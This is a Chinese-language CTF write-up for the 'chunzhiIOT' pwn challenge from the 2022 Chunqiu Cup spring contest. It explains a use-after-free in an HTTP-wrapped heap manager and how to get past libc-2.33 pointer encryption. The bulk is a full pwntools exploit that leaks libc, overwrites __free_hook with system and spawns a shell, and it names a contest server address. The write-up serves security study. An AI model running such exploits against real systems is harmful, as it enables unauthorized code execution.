---
layout: article
pageview: true
key: 2022-05-07-ichunqiu2022-pwn-wp 
title: 2022年春秋杯网络安全联赛-春季赛Pwn题WP
author: Ch4rc0al
categories: 
    - WriteUps
tags: 
    - CTF
    - Pwn
---

<!--more-->

题目分数是从第一个人解出来后按时间减少的，一道500分的题做出来后只剩55分了。。。

## chunzhiIOT

`libc-2.33`

保护全开

一道`x86`架构的题，题目功能是接受HTTP协议的堆管理器，相当于HTTP套壳的堆题

题目每次接受一个HTTP请求，并根据请求的内容填充一个结构体，再根据结构体的内容来对堆进行操作

要想成功将指令写入结构体，需要进行`POST`请求，并且指令再14行含有字符`:`的字符串后

每次操作堆时的指令为`cmd&idx&arg1&arg2&arg3...`

根据题目逻辑，要想进行堆操作，必须先进行一次`CONNECT`请求，并传入字符串`rotartsinimda`

题目的漏洞为非常明显的`UAF`，可以泄露和修改已经释放的堆快，考点再题目环境上

在`libc-2.33`中，对于`fastbin`以及`tcache`的fd指针会被进行异或操作加密，用来异或的值随堆地址发生改变

我们的思路依然是泄露`libc`基址后修改`__free_hook`为`system`，和低版本`UAF`相比，我们需要申请两个`chunk`后释放掉，泄露出`key`，最后修改`fd`时需要填入`key ^ __free_hook`的值来写入加密后的`fd`

完整exp如下


```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64')
context.log_level = 'debug'

_elf = './pwn'
_libc = './libc-2.33.so'
_addr = '101.200.198.40'
_port = 44815

local = 1

libc = ELF(_libc)


def getConn():
    if local == 1:
        # return process([_elf], env={'LD_PRELOAD': _libc})
        return process(_elf)
    else:
        return remote(_addr, _port)


def debug(p, cmd=None):
    if local == 1:
        gdb.attach(p, cmd)
    pause()


def rn(con):
    return con+b'\r\n'


def add(idx, size, con):
    pay = p8(1)+b'&'+bytes(str(idx), 'ascii') + \
        b'&'+bytes(str(size), 'ascii')+b'&'+con
    p.sendafter(b'Waiting Package...\n', pad+rn(pay))


def edit(idx, con):
    pay = p8(2)+b'&'+bytes(str(idx), 'ascii')+b'&'+con
    p.sendafter(b'Waiting Package...\n', pad+rn(pay))


def show(idx):
    pay = p8(3)+b'&'+bytes(str(idx), 'ascii')
    p.sendafter(b'Waiting Package...\n', pad+rn(pay))


def delete(idx):
    pay = p8(4)+b'&'+bytes(str(idx), 'ascii')
    p.sendafter(b'Waiting Package...\n', pad+rn(pay))


pad = rn(b'POST /aa HTTP/1.1')
pad += rn(b':')*14

ogg = [911244, 911247, 911250, 911733, 911737]

p = getConn()

pay1 = rn(b'DEV / HTTP/1.1')
pay1 += rn(b':')*14
pay1 += rn(b'rotartsinimda')
p.sendafter(b'Waiting Package...\n', pay1)


add(0, 0x80, b'a')
add(1, 0x80, b'a')
add(2, 0x20, b'/bin/sh\x00')
delete(0)
delete(1)

show(0)
p.recvuntil(b'Content-Length')
p.recvline()
a0 = u64(p.recv(5)+b'\0\0\0')
show(1)
p.recvuntil(b'Content-Length')
p.recvline()
a1 = u64(p.recv(6)+b'\0\0')

log.info(hex(a0))
log.info(hex(a1))
log.info(hex(a1 ^ a0))
r_a0 = a1 ^ a0

add(3, 0x420, b'a')
add(4, 0x20, b'a')
delete(3)
edit(3, b'\x0a')
show(3)
p.recvuntil(b'Content-Length')
p.recvline()
libc_base = u64(p.recv(6)+b'\0\0')-0xa-96-0x10-libc.sym['__malloc_hook']
# edit(3,b'\x00')

log.success(hex(libc_base))


system = libc_base+libc.sym['system']
freehook = libc_base+libc.sym['__free_hook']

log.info(hex(freehook ^ a0))

edit(1, p64(freehook ^ a0))

add(5, 0x80, p64(system))
add(6, 0x80, p64(system))

delete(2)

debug(p)
p.interactive()

```